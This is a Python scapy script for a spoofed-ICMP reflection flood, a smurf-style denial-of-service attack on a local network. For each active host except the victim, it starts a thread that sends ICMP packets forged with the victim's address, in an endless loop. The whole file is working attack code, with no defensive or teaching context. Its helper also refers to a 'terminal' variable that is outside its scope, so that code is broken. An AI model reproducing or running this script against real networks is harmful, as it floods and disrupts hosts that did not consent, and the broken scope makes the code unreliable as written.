from scapy.all import *
import threading

def reflection(victim,active_ips,terminal = None):

    icmp_threads = []
    send_icmp = []

    for name,hwaddr,addr in active_ips:
        if addr[0] == victim:
            pass
        else:
            send_icmp.append(addr[0])

    for ip in send_icmp:
        t = threading.Thread(target = __send_spoofed_icmp, args = (ip,victim))
        t.daemon = True
        t.start()
        icmp_threads.append(t)

    for t in icmp_threads:
        t.join()

def __send_spoofed_icmp(ip,victim):
    if terminal == None:
        print("[+] Sending packets to "+ip)
    else:
        terminal.configure(text=terminal.cget("text")+'\n[+] Sending packets to '+ip)
    packet = IP(src=victim,dst=ip)/ICMP()
    while 1:
        send(packet,verbose = 0)
